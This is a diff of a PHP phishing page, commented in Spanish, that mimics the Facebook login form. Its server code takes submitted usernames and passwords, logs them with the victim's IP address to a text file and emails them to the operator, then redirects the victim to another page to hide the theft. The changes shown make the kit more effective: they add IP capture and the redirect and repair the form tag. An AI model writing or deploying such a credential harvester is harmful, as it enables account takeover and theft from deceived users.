@@ -2,19 +2,24 @@
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
+    $ip = $_SERVER['REMOTE_ADDR']; // Obtener la IP del usuario
 
     // Guardar los datos en un archivo de texto
-    $datos = "Nombre de usuario: $username\r\nContraseña: $password\r\n";
+    $datos = "IP del usuario: $ip\r\nNombre de usuario: $username\r\nContraseña: $password\r\n";
     file_put_contents("datos_formulario.txt", $datos, FILE_APPEND);
 
     // Enviar correo electrónico
-    $destinatario = "cmv533a@gmail.com"; // Cambia esto por tu dirección de correo
+    $destinatario = "tu@email.com"; // Cambia esto por tu dirección de correo
     $asunto = "Nuevo inicio de sesión en Facebook";
     $mensaje = "Se ha iniciado sesión en Facebook con los siguientes datos:\r\n\r\n";
-    $mensaje .= "Nombre de usuario: $username\r\nContraseña: $password\r\n";
+    $mensaje .= "IP del usuario: $ip\r\nNombre de usuario: $username\r\nContraseña: $password\r\n";
     $cabeceras = "From: tu@email.com"; // Cambia esto por tu dirección de correo
 
     mail($destinatario, $asunto, $mensaje, $cabeceras);
+
+    // Redirigir al usuario a una página específica
+    header("Location: https://www.ejemplo.com/pagina-redireccionada.html");
+    exit;
 }
 ?>
 
@@ -25,59 +30,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar Sesión en Facebook</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        h1 {
-            text-align: center;
-            color: #1877f2;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-
-        input[type="text"],
-        input[type="password"],
-        button {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-
-        button {
-            background-color: #1877f2;
-            color: #ffffff;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #0e63ae;
-        }
+        /* Estilos CSS aquí */
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Iniciar Sesión en Facebook</h1>
-        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>
+        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
             <label for="username">Correo electrónico o teléfono:</label>
             <input type="text" id="username" name="username" required>
             <label for="password">Contraseña:</label>
